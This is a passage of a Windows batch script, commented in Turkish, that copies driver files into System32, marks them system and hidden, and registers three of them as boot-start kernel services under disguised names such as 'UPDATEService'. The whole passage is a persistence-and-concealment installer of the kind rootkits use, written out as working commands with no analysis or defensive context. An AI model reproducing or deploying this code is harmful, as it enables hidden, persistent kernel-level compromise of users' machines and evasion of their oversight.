...
if exist "%~dp0al1.sys" (
    copy /y "%~dp0al1.sys" "%system32Dir%"
)
if exist "%~dp0al3.sys" (
    copy /y "%~dp0al3.sys" "%system32Dir%"
)

:: Dosyaları sistem dosyası olarak ayarla ve gizle
attrib +s +h "%system32Dir%al1.sys"
attrib +s +h "%system32Dir%al2.sys"
attrib +s +h "%system32Dir%al3.sys"

:: Yeni servisleri oluştur
C:\Windows\system32\cmd.exe /c sc create al1 binPath= "C:\Windows\System32\al1.sys" DisplayName= "UPDATEService" start= boot tag= 2 type= kernel group="System Reserved"
C:\Windows\system32\cmd.exe /c sc create al2 binPath= "C:\Windows\System32\al2.sys" DisplayName= "UPDATEService4" start= boot tag= 2 type= kernel group="System Reserved"
C:\Windows\system32\cmd.exe /c sc create al3 binPath= "C:\Windows\System32\al3.sys" DisplayName= "UPDATEService5" start= boot tag= 2 type= kernel group="System Reserved"
